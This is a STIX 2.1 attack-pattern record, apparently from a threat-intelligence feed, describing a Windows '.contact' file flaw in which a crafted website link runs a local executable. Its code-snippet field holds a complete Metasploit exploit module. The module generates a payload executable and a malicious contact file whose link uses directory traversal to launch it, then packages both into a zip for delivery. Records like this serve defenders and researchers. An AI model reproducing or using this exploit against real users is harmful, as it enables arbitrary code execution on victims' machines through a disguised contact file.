{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2ea77f27-c3c9-4bf7-ab9b-bf6446b32f2f",
    "created": "2024-08-14T16:37:44.131157Z",
    "modified": "2024-08-14T16:37:44.131161Z",
    "name": "Microsoft Windows Contact File Format Arbitary Code Execution",
    "description": " This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Microsoft Windows. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The flaw is due to the processing of \".contact\" files <c:Url> node param which takes an expected website value, however if an attacker references an executable file it will run that instead without warning instead of performing expected web navigation. This is dangerous and would be unexpected to an end user. Executable files can live in a sub-directory so when the \".contact\" website link is clicked it traverses directories towards the executable and runs. Making matters worse is if the files are compressed then downloaded \"mark of the web\" (MOTW) may potentially not work as expected with certain archive utilitys. The \".\\\" chars allow directory traversal to occur in order to run the attackers supplied executable sitting unseen in the attackers directory. This advisory is a duplicate issue that currently affects Windows .VCF files, and released for the sake of completeness as it affects Windows .contact files as well. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/microsoft_windows_contact.rb",
            "external_id": "microsoft_windows_contact.rb"
        },
        {
            "source_name": "reference",
            "url": "http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-CONTACT-FILE-INSUFFECIENT-UI-WARNING-WEBSITE-LINK-ARBITRARY-CODE-EXECUTION.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'fileutils'\nrequire 'rex/zip'\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Microsoft Windows Contact File Format Arbitary Code Execution',\n      'Description' => %q{\n        This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Microsoft Windows.\n        User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The flaw is due to the processing of \".contact\" files <c:Url> node param which takes an expected website value, however if an attacker references an\n        executable file it will run that instead without warning instead of performing expected web navigation. This is dangerous and would be unexpected to an end user.\n        Executable files can live in a sub-directory so when the \".contact\" website link is clicked it traverses directories towards the executable and runs.\n        Making matters worse is if the files are compressed then downloaded \"mark of the web\" (MOTW) may potentially not work as expected with certain archive utilitys.\n        The \".\\\" chars allow directory traversal to occur in order to run the attackers supplied executable sitting unseen in the attackers directory.\n        This advisory is a duplicate issue that currently affects Windows .VCF files, and released for the sake of completeness as it affects Windows .contact files as well.\n      },\n      'Author'      =>\n        [ 'John Page (aka hyp3rlinx)', # Vuln discovery\n          'Brenner Little' # MSF module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['EDB', '46188'],\n          ['URL', 'http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-CONTACT-FILE-INSUFFECIENT-UI-WARNING-WEBSITE-LINK-ARBITRARY-CODE-EXECUTION.txt'],\n          ['ZDI', '19-013']\n        ],\n      'DisclosureDate' => '2019-01-17', # According to https://www.exploit-db.com/exploits/46188\n      'Privileged'     => false,\n      'Platform'       => 'win',\n      'Payload'        => {\n        'DisableNops' => true\n      },\n      'DefaultOptions' => {\n        'DisablePayloadHandler' => true\n      },\n      'Targets'        => [['Windows', { }]],\n      'DefaultTarget'  => 0\n      ))\n      register_options(\n      [\n        OptString.new('WEBSITE', [true, 'The URL that the user must click to launch the payload.', 'www.metasploit.com']),\n        OptString.new('FILENAME', [true, 'The first and last name embdeed in the .CONTACT file (also used as the filename for the .CONTACT and .ZIP files)', 'John Smith']),\n      ])\n  end\n  def exploit\n    contact_full_name = \"#{datastore['FILENAME']}\"\n    exe_filename = \"#{datastore['WEBSITE']}\"\n\n    xml_header = %Q|<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\\t<c:contact c:Version=\"1\" xmlns:c=\"http://schemas.microsoft.com/Contact\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:MSP2P=\"http://schemas.microsoft.com/Contact/Extended/MSP2P\">\n\\t<c:CreationDate>2019-04-10T20:19:26Z</c:CreationDate><c:Extended xsi:nil=\"true\"/>\n\\t|\n\n    xml_body = %Q|\n        <c:ContactIDCollection>\n          <c:ContactID c:ElementID=\"492912d2-db87-4da2-9fb0-1a3533284d09\"><c:Value>e3b2d76c-3355-4f54-b995-0ce0dcf84c8a</c:Value></c:ContactID>\n        </c:ContactIDCollection>\n        <c:NameCollection>\n          <c:Name c:ElementID=\"9c47b169-4385-40e9-97cf-cc2f55544c8d\">\n            <c:FormattedName>CONTACT_FULL_NAME</c:FormattedName>\n            <c:FamilyName>CONTACT_LAST_NAME</c:FamilyName>\n            <c:GivenName>CONTACT_FIRST_NAME</c:GivenName>\n          </c:Name>\n        </c:NameCollection>\n        <c:PhotoCollection>\n          <c:Photo c:ElementID=\"9b2b24b3-2ce5-4553-abe1-8cb0cf7ad12e\">\n            <c:LabelCollection>\n              <c:Label>UserTile</c:Label>\n            </c:LabelCollection>\n          </c:Photo>\n        </c:PhotoCollection>\n        <c:UrlCollection c:Version=\"1\" c:ModificationDate=\"2019-04-10T21:15:00Z\">\n          <c:Url c:ElementID=\"4aca9a0f-72fd-45ff-8683-1524caafd6e9\" c:Version=\"1\" c:ModificationDate=\"2019-04-10T21:15:00Z\">\n            <c:Value c:Version=\"1\" c:ModificationDate=\"2019-04-10T21:15:00Z\">EXE_PATH</c:Value>\n            <c:LabelCollection>\n              <c:Label c:Version=\"1\" c:ModificationDate=\"2019-04-10T21:15:00Z\">Business</c:Label>\n            </c:LabelCollection>\n          </c:Url>\n        </c:UrlCollection>\n      </c:contact>|.gsub(/\\n[ ]*/,'')\n\n    xml = xml_header + xml_body\n    xml.gsub!(/CONTACT_FULL_NAME/, contact_full_name);\n    xml.gsub!(/CONTACT_LAST_NAME/, contact_full_name.split(' ')[-1]);\n    xml.gsub!(/CONTACT_FIRST_NAME/, contact_full_name.split(' ')[0]);\n    xml.gsub!(/EXE_PATH/, \"http.\\\\\" + exe_filename);\n\n    exe = generate_payload_exe\n\n    zip = Rex::Zip::Archive.new\n    zip.add_file(\"/http/\" + exe_filename, exe)\n    zip.add_file(contact_full_name + \".contact\", xml)\n    zip.save_to(contact_full_name + \".zip\")\n    print_good(\"Created '#{contact_full_name}.zip'\")\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2019-01-17, # According to https://www.exploit-db.com/exploits/46188",
    "x_mitre_platforms": [
        "win'"
    ]
}